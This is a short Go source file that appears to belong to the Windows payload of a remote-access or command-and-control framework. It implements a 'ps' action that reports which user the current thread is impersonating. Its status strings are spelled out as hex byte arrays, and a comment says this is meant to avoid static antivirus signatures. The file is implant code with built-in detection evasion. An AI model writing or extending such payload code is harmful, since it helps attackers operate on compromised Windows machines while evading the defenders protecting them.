// server/docker/payloads/Windows/action_ps_windows.go
//go:build windows
// +build windows

package main

import (
	"syscall"
)

// PS strings (constructed to avoid static signatures)
var (
	psRunningAs    = string([]byte{0x52, 0x75, 0x6e, 0x6e, 0x69, 0x6e, 0x67, 0x20, 0x61, 0x73, 0x3a, 0x20}) // Running as:
	psBackslash    = string([]byte{0x5c})                                                                   // \
	psImpersonated = string([]byte{0x20, 0x28, 0x69, 0x6d, 0x70, 0x65, 0x72, 0x73, 0x6f, 0x6e, 0x61, 0x74, 0x65, 0x64, 0x29}) // (impersonated)
)

// getWindowsSecurityContext returns Windows-specific security context info
func getWindowsSecurityContext() string {
	if threadToken := GetThreadToken(); threadToken != 0 {
		defer syscall.Token(threadToken).Close()
		if user, domain := GetTokenUser(syscall.Handle(threadToken)); user != "" {
			return psRunningAs + domain + psBackslash + user + psImpersonated
		}
	}
	return ""
}
